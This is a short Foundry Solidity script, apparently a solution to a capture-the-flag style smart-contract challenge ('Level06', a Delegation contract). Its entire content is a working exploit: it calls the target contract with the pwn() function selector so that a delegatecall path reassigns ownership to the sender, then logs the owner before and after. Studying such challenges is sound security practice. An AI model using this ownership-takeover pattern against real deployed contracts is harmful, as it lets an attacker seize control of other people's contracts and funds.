// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/Level06.sol";

contract AttackerScript is Script {
    Delegation level06 = Delegation(0xB92118eF4e1EfC8512cd3fA24976348Cc5291c97);

    function run() public {
      vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
      console.log("Current owner: ", level06.owner());
      (bool success, ) = address(level06).call(abi.encodeWithSignature("pwn()"));
      console.log("isSuccess : ", success);
      console.log("New Owner: ", level06.owner());
      vm.stopBroadcast();
    }
}
